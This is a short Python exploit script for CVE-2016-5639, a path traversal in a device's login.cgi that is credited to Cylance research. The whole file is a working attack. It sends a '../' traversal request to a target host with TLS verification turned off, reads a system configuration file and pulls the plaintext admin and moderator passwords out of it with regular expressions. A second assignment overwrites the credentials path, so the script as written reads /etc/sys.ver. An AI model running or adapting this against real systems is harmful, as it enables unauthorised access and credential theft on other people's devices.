#!/usr/bin/env python3
"""
Exploit for CVE-2016-5639, a path traversal vulnerability discovered by Cylance.

References:
    * https://github.com/CylanceVulnResearch/disclosures/blob/master/CLVA-2016-05-001.md
    * https://www.cvedetails.com/cve/CVE-2016-5639/
"""
import sys
import re
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CREDS_FILE = "/etc/content/AwDefault.xml"
CREDS_FILE = "/etc/sys.ver"

def exploit(target):
    """
    Exploit path traversal to dump plaintext passwords from configuration file.
    Args:
        target(str): target hostname or IP address
    Returns:
        code(bool): 0 if successful, 1 otherwise
    """
    resp = requests.get(
        "https://{}/cgi-bin/login.cgi?lang=en&src=../../../../../../../..{}"\
            .format(target, CREDS_FILE),
        verify=False
    )
    print(resp.content)
    if resp.status_code == 200:
        admin_pass = re.findall(
            r"name=\"LONG_ADMIN_PWD\".*?value=\"([^\"]*)\"",
            resp.content.decode('utf-8')
        )
        moderator_pass = re.findall(
            r"name=\"LONG_TRAINER_PWD\".*?value=\"([^\"]*)\"",
            resp.content.decode('utf-8')
        )
        if admin_pass:
            print("[+] Admin password is: {}".format(admin_pass[0]))
        if moderator_pass:
            print("[+] Moderator password is: {}".format(moderator_pass[0]))
        return 0
    return 1


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: {} target".format(sys.argv[0]))
        sys.exit(1)
    sys.exit(exploit(sys.argv[1]))
